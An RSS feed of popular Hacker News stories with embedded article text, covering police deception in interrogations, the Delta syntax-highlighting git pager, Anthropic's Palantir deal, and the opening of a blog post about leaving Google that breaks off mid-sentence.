<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Sat, 09 Nov 2024 05:30:04 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[It's legal for police to use deception in interrogations. Some want that to end (183 pts)]]></title>
            <link>https://text.npr.org/nx-s1-4974964</link>
            <guid>42091423</guid>
            <pubDate>Fri, 08 Nov 2024 23:57:13 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://text.npr.org/nx-s1-4974964">https://text.npr.org/nx-s1-4974964</a>, See on <a href="https://news.ycombinator.com/item?id=42091423">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <p>Ted Bradford says the worst day of his life was when detectives took him into a tiny room to question him about a rape.</p><p>â€œThe whole day it was like accusation after accusation,â€ he says. â€œI kept telling them over and over, â€˜I didn't do this.â€™â€</p><p>Bradford says the officers in Yakima, Wash., <a href="https://wainnocenceproject.org/stories/ted-bradford/"><u>claimed they had biological evidence</u></a> that would prove he did it, and they weren't going to let him leave until he admitted it.</p><p>â€œI knew I didnâ€™t do it,â€ he said. â€œSo I'm thinking, â€˜In order to get out of this situation, I could just give them a statement. Theyâ€™ll test that evidence. Itâ€™ll show that I didnâ€™t do it, and then this will all be done with.â€™â€</p><p>After<em> </em>hours of questioning, Bradford confessed to the crime. But the evidence police had â€“ a mask left at the scene â€“ could not be DNA-tested. This was the late nineties and the technology wasnâ€™t there yet.</p><p>Bradford recanted his confession, but was convicted anyway. He was 22 with two small children when he went to prison.</p><p>â€œEvery day I woke up and knew that I shouldn't be there,â€ he says.</p><p>Advancements in DNA testing helped lead to his exoneration in 2010.</p><p>What happened to Bradford might seem extreme, but nearly 30 years later, the tactic used on him is not. In every state, police officers are allowed to lie to adults during an interrogation. The hope, in many cases, is that theyâ€™ll get a person to confess to committing a crime.</p><p>When it comes to children and teenagers, a growing number of states are stopping that practice: Ten have passed laws in recent years effectively banning police from lying to juveniles during interrogations, starting with Illinois in 2021. But some legal advocates are pushing for a deception ban that would apply to everyone, not just kids.</p><h2>â€˜A quick and relatively straightforward way to close a caseâ€™</h2><p>Deception is a powerful law enforcement tool in eliciting confessions, says wrongful convictions attorney Laura Nirider.</p><p>â€œPolice are trained around the country in all 50 states to use deception during interrogation, to lie both about the evidence against a suspect and to lie about the consequences of confessing in order to make it seem not so bad if you just say that you did these things,â€ she says.</p><p>Police can go into an interrogation room with a suspect, Nirider says, and emerge with â€œone of the most believable pieces of evidence imaginable, a confession.â€</p><p>â€œIt's a quick and relatively straightforward way to close a case,â€ she says.</p><p>But Nirider says using deception can also draw false confessions.</p><p>According to the Innocence Project, a national organization that works to overturn wrongful convictions, nearly a third of DNA exonerations from 1989 to 2020 <a href="https://innocenceproject.org/dna-exonerations-in-the-united-states/"><u>involved a false confession</u></a>.</p><p>Legal experts say the deception bans passed in recent years fail to protect other vulnerable groups: young adults, people with intellectual disabilities, even just people who are naturally compliant.</p><p>â€œChildren are one category that makes you more vulnerable, but it's certainly not the only category,â€ says Lara Zarowsky, executive and policy director at the Washington Innocence Project. â€œIt's something that all of us are vulnerable to.â€</p><h2>â€˜Law enforcement is the biggest impedimentâ€™</h2><p>In Washington state, where Bradford was convicted, Democratic lawmakers want to set a higher bar: A bill that would make incriminating statements made in police custody â€“ by adults or children â€“ largely inadmissible in court if obtained using deception.</p><p>State Rep. Strom Peterson has introduced the bill twice, but it hasnâ€™t gone anywhere.</p><p>â€œLaw enforcement is the biggest impediment to the bill. They believe that the system in which they work is effective,â€ he says.</p><p>The Washington Association of Sheriffs and Police Chiefs declined NPRâ€™s request for an interview, but said in a statement that it opposes such a measure, because banning deception would take away a tactic that yields â€œmany more true confessionsâ€ than false ones.</p><p>â€œWe fear that it will negatively impact our ability to solve crimes and would result in less accountability for those who victimize others,â€ the associationâ€™s policy director, James McMahan, <a href="https://tvw.org/video/house-appropriations-2024021057/?eventID=2024021057"><u>said at a hearing</u></a> for the bill in February.</p><p>â€œCriminals often conduct elaborate stories to conceal their crimes,â€ McMahan said at the hearing. â€œSometimes the use of deception is required to locate the truth both to convict and to exonerate people. Such deceptions include telling a person that abuse was discovered during a routine medical exam rather than reported by a family member.â€</p><p>In its statement, the association added that judges assess whether confessions are given voluntarily before they can be introduced as evidence, and convictions based solely on confessions are rare.</p><p>Even with other evidence, however, confessions carry a lot of weight. Research indicates that people who confess <a href="https://core.ac.uk/reader/81748492?utm_source=linkout"><u>are treated differently</u></a> afterwards: Theyâ€™re more likely to be charged, face more charges, and receive a harsher punishment when convicted.</p><p>â€œA confession will trump everything,â€ says Jim Trainum, a retired homicide detective in Washington, D.C.</p><p>In his experience, there is pressure to move on after a suspect confesses because a detectiveâ€™s measure of success is often tied to closure rates.</p><p>â€œLet's say that I get a confession and I get all the stuff that I want to go out and corroborate. I want to make sure that this is an accurate confession,â€ Trainum says. â€œI'm sitting there at my desk working very, very hard on it. And my sergeant comes up and says, â€˜What are you doing? That's a confession. That's closed. Move on. You got other ones to take care of.â€™â€</p><h2>â€˜Trying to give the police new toolsâ€™</h2><p>Those against deception bans see them as an attack on police, says Mark Fallon, a consultant on interrogation practices and former federal agent. In fact, he says, itâ€™s the opposite.</p><p>â€œIt is actually trying to give the police new tools, better tools,â€ he says.</p><p>Thereâ€™s another way for police to question people, Fallon says, that relies on building rapport and asking open-ended questions, and where the primary goal is information, rather than a confession.</p><p>That technique is used in other countries, including much of Europe. In England, France, Germany, Australia, Japan and elsewhere, for instance, the police are generally <a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3669413"><u>not allowed to deceive suspects</u></a>.</p><p>Trainum says interrogation methods that donâ€™t rely on deception ultimately make the police more trustworthy to communities.</p><p>â€œTodayâ€™s suspect is tomorrow's witness,â€ he says.</p><p>When a suspect or witness has been lied to, he says, â€œthat radiates out. And no wonder people don't trust us. Why should they trust us?â€</p><p>That is why Peterson, the lawmaker, plans to introduce the bill in Washington again. He says the public is<em> </em>better off when police use the best tools available to convict the right people.</p>
      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Delta: A syntax-highlighting pager for Git, diff, grep, and blame output (226 pts)]]></title>
            <link>https://github.com/dandavison/delta</link>
            <guid>42091365</guid>
            <pubDate>Fri, 08 Nov 2024 23:46:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/dandavison/delta">https://github.com/dandavison/delta</a>, See on <a href="https://news.ycombinator.com/item?id=42091365">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto">
  <a target="_blank" rel="noopener noreferrer nofollow" href="https://user-images.githubusercontent.com/52205/147996902-9829bd3f-cd33-466e-833e-49a6f3ebd623.png"><img width="400px" src="https://user-images.githubusercontent.com/52205/147996902-9829bd3f-cd33-466e-833e-49a6f3ebd623.png" alt="image"></a>
</p>
<p dir="auto">
  <a href="https://github.com/dandavison/delta/actions">
    <img src="https://github.com/dandavison/delta/workflows/Continuous%20Integration/badge.svg" alt="CI">
  </a>
  <a href="https://coveralls.io/github/dandavison/delta?branch=main" rel="nofollow">
    <img src="https://camo.githubusercontent.com/e8785ac8ede00f6ec8ad672e5031d27eb6eb5a599d56b232a469b9824f76753c/68747470733a2f2f636f766572616c6c732e696f2f7265706f732f6769746875622f64616e64617669736f6e2f64656c74612f62616467652e7376673f6272616e63683d6d61696e" alt="Coverage Status" data-canonical-src="https://coveralls.io/repos/github/dandavison/delta/badge.svg?branch=main">
  </a>
  <a href="https://gitter.im/dandavison-delta/community?utm_source=badge&amp;utm_medium=badge&amp;utm_campaign=pr-badge" rel="nofollow">
    <img src="https://camo.githubusercontent.com/6c92914f6e39c859372cd85d6c7676c73d524f994663f1ae0e2b0b566a0e1361/68747470733a2f2f6261646765732e6769747465722e696d2f64616e64617669736f6e2d64656c74612f636f6d6d756e6974792e737667" alt="Gitter" data-canonical-src="https://badges.gitter.im/dandavison-delta/community.svg">
  </a>
</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Get Started</h2><a id="user-content-get-started" aria-label="Permalink: Get Started" href="#get-started"></a></p>
<p dir="auto"><a href="https://dandavison.github.io/delta/installation.html" rel="nofollow">Install it</a> (the package is called "git-delta" in most package managers, but the executable is just <code>delta</code>) and add this to your <code>~/.gitconfig</code>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="[core]
    pager = delta

[interactive]
    diffFilter = delta --color-only

[delta]
    navigate = true    # use n and N to move between diff sections

    # delta detects terminal colors automatically; set one of these to disable auto-detection
    # dark = true
    # light = true

[merge]
    conflictstyle = zdiff3"><pre>[<span>core</span>]
    <span>pager</span> <span>=</span> <span>delta</span>

[<span>interactive</span>]
    <span>diffFilter</span> <span>=</span> <span>delta</span> <span>--color-only</span>

[<span>delta</span>]
    <span>navigate</span> <span>=</span> <span>true</span>    <span><span>#</span> use n and N to move between diff sections</span>

    <span><span>#</span> delta detects terminal colors automatically; set one of these to disable auto-detection</span>
    <span><span>#</span> dark = true</span>
    <span><span>#</span> light = true</span>

[<span>merge</span>]
    <span>conflictstyle</span> <span>=</span> <span>zdiff3</span></pre></div>
<p dir="auto">Delta has many features and is very customizable; please see the <a href="https://dandavison.github.io/delta/" rel="nofollow">user manual</a>.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Features</h2><a id="user-content-features" aria-label="Permalink: Features" href="#features"></a></p>
<ul dir="auto">
<li>Language syntax highlighting with the same syntax-highlighting themes as <a href="https://github.com/sharkdp/bat#readme">bat</a></li>
<li>Word-level diff highlighting using a Levenshtein edit inference algorithm</li>
<li>Side-by-side view with line-wrapping</li>
<li>Line numbering</li>
<li><code>n</code> and <code>N</code> keybindings to move between files in large diffs, and between diffs in <code>log -p</code> views (<code>--navigate</code>)</li>
<li>Improved merge conflict display</li>
<li>Improved <code>git blame</code> display (syntax highlighting; <code>--hyperlinks</code> formats commits as links to hosting provider etc. Supported hosting providers are: GitHub, GitLab, SourceHut, Codeberg)</li>
<li>Syntax-highlights grep output from <code>rg</code>, <code>git grep</code>, <code>grep</code>, etc</li>
<li>Support for Git's <code>--color-moved</code> feature.</li>
<li>Code can be copied directly from the diff (<code>-/+</code> markers are removed by default).</li>
<li><code>diff-highlight</code> and <code>diff-so-fancy</code> emulation modes</li>
<li>Commit hashes can be formatted as terminal <a href="https://gist.github.com/egmontkob/eb114294efbcd5adb1944c9f3cb5feda">hyperlinks</a> to the hosting provider page (<code>--hyperlinks</code>).
File paths can also be formatted as hyperlinks for opening in your OS.</li>
<li>Stylable box/line decorations to draw attention to commit, file and hunk header sections.</li>
<li>Style strings (foreground color, background color, font attributes) are supported for &gt;20 stylable elements, using the same color/style language as git</li>
<li>Handles traditional unified diff output in addition to git output</li>
<li>Automatic detection of light/dark terminal background</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">A syntax-highlighting pager for git, diff, and grep output</h2><a id="user-content-a-syntax-highlighting-pager-for-git-diff-and-grep-output" aria-label="Permalink: A syntax-highlighting pager for git, diff, and grep output" href="#a-syntax-highlighting-pager-for-git-diff-and-grep-output"></a></p>
<p dir="auto">Code evolves, and we all spend time studying diffs. Delta aims to make this both efficient and enjoyable: it allows you to make extensive changes to the layout and styling of diffs, as well as allowing you to stay arbitrarily close to the default git/diff output.</p>
<markdown-accessiblity-table><p>
      <a target="_blank" rel="noopener noreferrer nofollow" href="https://user-images.githubusercontent.com/52205/86275526-76792100-bba1-11ea-9e78-6be9baa80b29.png"><img width="400px" src="https://user-images.githubusercontent.com/52205/86275526-76792100-bba1-11ea-9e78-6be9baa80b29.png" alt="image"></a>
      <br>
      <sub>delta with <code>line-numbers</code> activated</sub>
    </p></markdown-accessiblity-table>
<markdown-accessiblity-table><p>
      <a target="_blank" rel="noopener noreferrer nofollow" href="https://user-images.githubusercontent.com/52205/87230973-412eb900-c381-11ea-8aec-cc200290bd1b.png"><img width="800px" src="https://user-images.githubusercontent.com/52205/87230973-412eb900-c381-11ea-8aec-cc200290bd1b.png" alt="image"></a>
      <br>
      <sub>delta with <code>side-by-side</code> and <code>line-numbers</code> activated</sub>
    </p></markdown-accessiblity-table>
<p dir="auto">Here's what <code>git show</code> can look like with git configured to use delta:</p>
<br>
<markdown-accessiblity-table></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Syntax-highlighting themes</h3><a id="user-content-syntax-highlighting-themes" aria-label="Permalink: Syntax-highlighting themes" href="#syntax-highlighting-themes"></a></p>
<p dir="auto"><strong>All the syntax-highlighting color themes that are available with <a href="https://github.com/sharkdp/bat/">bat</a> are available with delta:</strong></p>
<br>
<markdown-accessiblity-table></markdown-accessiblity-table>

<p dir="auto"><h3 tabindex="-1" dir="auto">Side-by-side view</h3><a id="user-content-side-by-side-view" aria-label="Permalink: Side-by-side view" href="#side-by-side-view"></a></p>
<p dir="auto">[<a href="https://dandavison.github.io/delta/side-by-side-view.html" rel="nofollow">User manual</a>]</p>
<div dir="auto" data-snippet-clipboard-copy-content="[delta]
    side-by-side = true"><pre>[<span>delta</span>]
    <span>side-by-side</span> <span>=</span> <span>true</span></pre></div>
<p dir="auto">By default, side-by-side view has line-numbers activated, and has syntax highlighting in both the left and right panels: [<a href="#side-by-side-view-1">config</a>]</p>
<markdown-accessiblity-table><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://user-images.githubusercontent.com/52205/87230973-412eb900-c381-11ea-8aec-cc200290bd1b.png"><img width="800px" src="https://user-images.githubusercontent.com/52205/87230973-412eb900-c381-11ea-8aec-cc200290bd1b.png" alt="image"></a></p></markdown-accessiblity-table>
<p dir="auto">Side-by-side view wraps long lines automatically:</p>
<markdown-accessiblity-table><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://user-images.githubusercontent.com/52205/139064537-f8479504-16d3-429a-b4f6-d0122438adaa.png"><img width="600px" src="https://user-images.githubusercontent.com/52205/139064537-f8479504-16d3-429a-b4f6-d0122438adaa.png" alt="image"></a></p></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Line numbers</h3><a id="user-content-line-numbers" aria-label="Permalink: Line numbers" href="#line-numbers"></a></p>
<p dir="auto">[<a href="https://dandavison.github.io/delta/line-numbers.html" rel="nofollow">User manual</a>]</p>
<div dir="auto" data-snippet-clipboard-copy-content="[delta]
    line-numbers = true"><pre>[<span>delta</span>]
    <span>line-numbers</span> <span>=</span> <span>true</span></pre></div>
<markdown-accessiblity-table><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://user-images.githubusercontent.com/52205/86275526-76792100-bba1-11ea-9e78-6be9baa80b29.png"><img width="400px" src="https://user-images.githubusercontent.com/52205/86275526-76792100-bba1-11ea-9e78-6be9baa80b29.png" alt="image"></a></p></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Merge conflicts</h3><a id="user-content-merge-conflicts" aria-label="Permalink: Merge conflicts" href="#merge-conflicts"></a></p>
<p dir="auto">[<a href="https://dandavison.github.io/delta/merge-conflicts.html" rel="nofollow">User manual</a>]</p>
<markdown-accessiblity-table><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://user-images.githubusercontent.com/52205/144783121-bb549100-69d8-41b8-ac62-1704f1f7b43e.png"><img width="500px" src="https://user-images.githubusercontent.com/52205/144783121-bb549100-69d8-41b8-ac62-1704f1f7b43e.png" alt="image"></a></p></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Git blame</h3><a id="user-content-git-blame" aria-label="Permalink: Git blame" href="#git-blame"></a></p>
<p dir="auto">[<a href="https://dandavison.github.io/delta/git-blame.html" rel="nofollow">User manual</a>]</p>
<markdown-accessiblity-table><p><a target="_blank" rel="noopener noreferrer nofollow" href="https://user-images.githubusercontent.com/52205/141891376-1fdb87dc-1d9c-4ad6-9d72-eeb19a8aeb0b.png"><img width="600px" src="https://user-images.githubusercontent.com/52205/141891376-1fdb87dc-1d9c-4ad6-9d72-eeb19a8aeb0b.png" alt="image"></a></p></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Ripgrep, git grep</h3><a id="user-content-ripgrep-git-grep" aria-label="Permalink: Ripgrep, git grep" href="#ripgrep-git-grep"></a></p>
<p dir="auto">[<a href="https://dandavison.github.io/delta/grep.html" rel="nofollow">User manual</a>]</p>
<markdown-accessiblity-table><p>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/52205/242993705-d203d380-5acb-4296-aeb9-e38c73d6c27f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzExMTk3MDMsIm5iZiI6MTczMTExOTQwMywicGF0aCI6Ii81MjIwNS8yNDI5OTM3MDUtZDIwM2QzODAtNWFjYi00Mjk2LWFlYjktZTM4YzczZDZjMjdmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDExMDklMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQxMTA5VDAyMzAwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTM0YTI4NDcxNzJhNjgwZjYyZmU0YzAzMzU0NDRlNWVlOWYwN2ZhMzYwYzUyMzg0MzgxZmIwYTcwYzFmNGY5OTAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.KIvs6cUnqPH2O6y8UH16_sX9nhVwj9vdzsY6x6HmdJY"><img width="600px" alt="image" src="https://private-user-images.githubusercontent.com/52205/242993705-d203d380-5acb-4296-aeb9-e38c73d6c27f.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzExMTk3MDMsIm5iZiI6MTczMTExOTQwMywicGF0aCI6Ii81MjIwNS8yNDI5OTM3MDUtZDIwM2QzODAtNWFjYi00Mjk2LWFlYjktZTM4YzczZDZjMjdmLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDExMDklMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQxMTA5VDAyMzAwM1omWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTM0YTI4NDcxNzJhNjgwZjYyZmU0YzAzMzU0NDRlNWVlOWYwN2ZhMzYwYzUyMzg0MzgxZmIwYTcwYzFmNGY5OTAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.KIvs6cUnqPH2O6y8UH16_sX9nhVwj9vdzsY6x6HmdJY"></a>
</p></markdown-accessiblity-table>
<p dir="auto"><h3 tabindex="-1" dir="auto">Installation and usage</h3><a id="user-content-installation-and-usage" aria-label="Permalink: Installation and usage" href="#installation-and-usage"></a></p>
<p dir="auto">Please see the <a href="https://dandavison.github.io/delta/" rel="nofollow">user manual</a> and <code>delta --help</code>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Maintainers</h3><a id="user-content-maintainers" aria-label="Permalink: Maintainers" href="#maintainers"></a></p>
<ul dir="auto">
<li><a href="https://github.com/dandavison">@dandavison</a></li>
<li><a href="https://github.com/th1000s">@th1000s</a></li>
</ul>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Claude AI to process secret government data through new Palantir deal (124 pts)]]></title>
            <link>https://arstechnica.com/ai/2024/11/safe-ai-champ-anthropic-teams-up-with-defense-giant-palantir-in-new-deal/</link>
            <guid>42091043</guid>
            <pubDate>Fri, 08 Nov 2024 22:42:20 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/ai/2024/11/safe-ai-champ-anthropic-teams-up-with-defense-giant-palantir-in-new-deal/">https://arstechnica.com/ai/2024/11/safe-ai-champ-anthropic-teams-up-with-defense-giant-palantir-in-new-deal/</a>, See on <a href="https://news.ycombinator.com/item?id=42091043">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
          
          
<h2>An ethical minefield</h2>
<p>Since its founders started Anthropic in 2021, the company has <a href="https://www.youtube.com/watch?v=UMF1nf3Iy3Q">marketed itself</a> as one that takes an ethics- and safety-focused approach to AI development. The company differentiates itself from competitors like OpenAI by adopting what it calls responsible development practices and self-imposed ethical constraints on its models, such as its "<a href="https://arstechnica.com/information-technology/2023/05/ai-with-a-moral-compass-anthropic-outlines-constitutional-ai-in-its-claude-chatbot/">Constitutional AI</a>" system.</p>
<p>As Futurism <a href="https://futurism.com/the-byte/ethical-ai-anthropic-palantir">points out</a>, this new defense partnership appears to conflict with Anthropic's public "good guy" persona, and pro-AI pundits on social media are noticing. <span>Frequent AI commentator Nabeel S. Qureshi <a href="https://x.com/nabeelqu/status/1854574146283618521">wrote</a> on X, </span><span>"Imagine telling the safety-concerned, effective altruist founders of Anthropic in 2021 that a mere three years after founding the company, they'd be signing partnerships to deploy their ~AGI model straight to the military frontlines.</span>"</p>
<figure>
    <div>
              <p><a data-pswp-width="1200" data-pswp-height="675" data-pswp-srcset="https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red-300x169.jpg 300w, https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red-640x360.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red-768x432.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red-384x216.jpg 384w, https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red-1152x648.jpg 1152w, https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red-980x551.jpg 980w, https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red.jpg 1200w" data-cropped="true" href="https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red.jpg" target="_blank">
                <img decoding="async" width="1200" height="675" src="https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red.jpg" alt="Anthropic's &quot;Constitutional AI&quot; logo." srcset="https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red.jpg 1200w, https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red-300x169.jpg 300w, https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red-640x360.jpg 640w, https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red-768x432.jpg 768w, https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red-384x216.jpg 384w, https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red-1152x648.jpg 1152w, https://cdn.arstechnica.net/wp-content/uploads/2024/11/anthropic_constitution_red-980x551.jpg 980w" sizes="(max-width: 1200px) 100vw, 1200px">
              </a></p><div id="caption-2061278"><p>
                Anthropic's "Constitutional AI" logo.
                                  </p><p>
                    Credit:
                                          Anthropic / Benj Edwards
                                      </p>
                              </div>
            </div>
                  <figcaption>
          <div>
    
    <p>
      Anthropic's "Constitutional AI" logo.

              <span>
          Credit:

          
          Anthropic / Benj Edwards

                  </span>
          </p>
  </div>
        </figcaption>
            </figure>

<p>Aside from the implications of working with defense and intelligence agencies, the deal connects Anthropic with Palantir, a <a href="https://amp.theguardian.com/commentisfree/2020/sep/04/palantir-ipo-ice-immigration-trump-administration">controversial company</a> which <a href="https://defensescoop.com/2024/05/29/palantir-480-million-army-contract-maven-smart-system-artificial-intelligence/">recently won</a> a $480 million contract to develop an AI-powered target identification system called Maven Smart System for the US Army. Project Maven has <a href="https://www.reuters.com/article/business/media-telecom/google-to-scrub-us-military-deal-protested-by-employees-source-idUSL2N1T320P/">sparked criticism</a> within the tech sector over military applications of AI technology.</p>
<p>It's worth noting that Anthropic's terms of service <a href="https://www.anthropic.com/news/expanding-access-to-claude-for-government">do outline</a> specific rules and limitations for government use. These terms permit activities like foreign intelligence analysis and identifying covert influence campaigns, while prohibiting uses such as disinformation, weapons development, censorship, and domestic surveillance. Government agencies that maintain regular communication with Anthropic about their use of Claude may receive broader permissions to use the AI models.</p>
<p>Even if Claude is never used to target a human or as part of a weapons system, other issues remain. While its Claude models are highly regarded in the AI community, they (like all LLMs) have the tendency to <a href="https://arstechnica.com/information-technology/2023/04/why-ai-chatbots-are-the-ultimate-bs-machines-and-how-people-hope-to-fix-them/">confabulate</a>, potentially generating incorrect information in a way that is difficult to detect.</p>
<p>That's a huge potential problem that could impact Claude's effectiveness with secret government data, and that fact, along with the other associations, has Futurism's Victor Tangermann worried. As he puts it, "It's a disconcerting partnership that sets up the AI industry's growing ties with the US military-industrial complex, a worrying trend that should raise all kinds of alarm bells given the tech's many inherent flawsâ€”and even more so when lives could be at stake."</p>


          
                  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I quit Google to work for myself (2018) (141 pts)]]></title>
            <link>https://mtlynch.io/why-i-quit-google/</link>
            <guid>42090430</guid>
            <pubDate>Fri, 08 Nov 2024 20:59:47 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://mtlynch.io/why-i-quit-google/">https://mtlynch.io/why-i-quit-google/</a>, See on <a href="https://news.ycombinator.com/item?id=42090430">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>For the past four years, Iâ€™ve worked as a software developer at Google. On February 1st, I quit. It was because they refused to buy me a Christmas present.</p><p>Well, I guess itâ€™s a little more complicated than that.</p><h2 id="the-first-two-years">The first two years<a href="#the-first-two-years" arialabel="Anchor"> ğŸ”—ï¸</a></h2><p>Two years in, I loved Google.</p><p>When the annual employee survey asked me whether I expected to be at Google in five years, it was a no-brainer.</p><p>Of <em>course</em> Iâ€™d still be at Google in five years. I was surrounded by the best engineers in the world, using the most advanced development tools in the world, and eating the free-est food in the world.</p><p><a href="https://mtlynch.io/why-i-quit-google/spoiled-coder.png"><img sizes="(min-width: 768px) 750px, 98vw" srcset="https://mtlynch.io/why-i-quit-google/spoiled-coder_hu4f194abb4e8e6858d1fbc287ed8a6d8e_188016_300x0_resize_lanczos_3.png 300w,
https://mtlynch.io/why-i-quit-google/spoiled-coder_hu4f194abb4e8e6858d1fbc287ed8a6d8e_188016_600x0_resize_lanczos_3.png 600w,
https://mtlynch.io/why-i-quit-google/spoiled-coder_hu4f194abb4e8e6858d1fbc287ed8a6d8e_188016_800x0_resize_lanczos_3.png 800w,
https://mtlynch.io/why-i-quit-google/spoiled-coder.png 1024w" src="https://mtlynch.io/why-i-quit-google/spoiled-coder.png" alt="My typical day at Google" loading="lazy"></a></p><p>My most recent performance rating was â€œStrongly Exceeds Expectations.â€ If I just kept going, Iâ€™d soon be promoted to the next level, Senior Software Engineer. What a great title! Forever after in my career, Iâ€™d be able to say, â€œYes, I was a <em>Senior</em> Software Engineer. At <em>Google</em>.â€ People would be so impressed.</p><p>My manager assured me that my promotion was close. He felt that I was already capable of senior-level work. I just needed the right project to prove it to the promotion committee.</p><p>No, managers at Google canâ€™t promote their direct reports. They donâ€™t even get a vote.</p><p>Instead, promotion decisions come from small committees of upper-level software engineers and managers who have never heard of you until the day they decide on your promotion.</p><p>You apply for promotion by assembling a â€œpromo packetâ€: a collection of written recommendations from your teammates, design documents youâ€™ve created, and mini-essays you write to explain why your work merits a promotion.</p><p>A promotion committee then reviews your packet with a handful of others, and they spend the day deciding who gets promoted and who doesnâ€™t.</p><p>During my two-year honeymoon phase, this system sounded great to me. Of <em>course</em> my fate should be in the hands of a mysterious committee whoâ€™s never met me. They wouldnâ€™t be tainted by any sort of favoritism or politics. Theyâ€™d see past all that and recognize me for my high-quality code and shrewd engineering decisions.</p><h2 id="thats-not-really-how-it-works">Thatâ€™s not really how it works<a href="#thats-not-really-how-it-works" arialabel="Anchor"> ğŸ”—ï¸</a></h2><p>Before I put together my first promo packet, I never thought about the logistics of how it all worked.</p><p>In my head, the promotion committee was this omniscient and fair entity. If I spent each day choosing the right problems to solve, making the codebase better, and helping my team execute efficiently, the promotion committee would magically know this and reward me for it.</p><p>Unsurprisingly, it doesnâ€™t work like that. It took me two years to figure that out.</p><h2 id="working-naÃ¯vely">Working naÃ¯vely<a href="#working-naÃ¯vely" arialabel="Anchor"> ğŸ”—ï¸</a></h2><p>My main responsibility until that point was a legacy data pipeline. It had been in maintenance mode for years, but load had increased, and the pipeline was buckling under the pressure. It frequently died silently or produced incorrect output. Its failures took days to diagnose because nobody had written documentation for it since its original design spec.</p><p>I proudly and lovingly nursed the pipeline back to health. I fixed dozens of bugs and wrote automated tests to make sure they wouldnâ€™t reappear. I deleted thousands of lines of code that were either dead or could be replaced by modern libraries. I documented the pipeline as I learned it so that the institutional knowledge was available to my teammates instead of siloed in my head.</p><p>The problem, as I discovered at promotion time, was that none of this was quantifiable. I couldnâ€™t prove that anything I did had a positive impact on Google.</p><h2 id="metrics-or-it-didnt-happen">Metrics or it didnâ€™t happen<a href="#metrics-or-it-didnt-happen" arialabel="Anchor"> ğŸ”—ï¸</a></h2><p>The pipeline didnâ€™t record many metrics. The 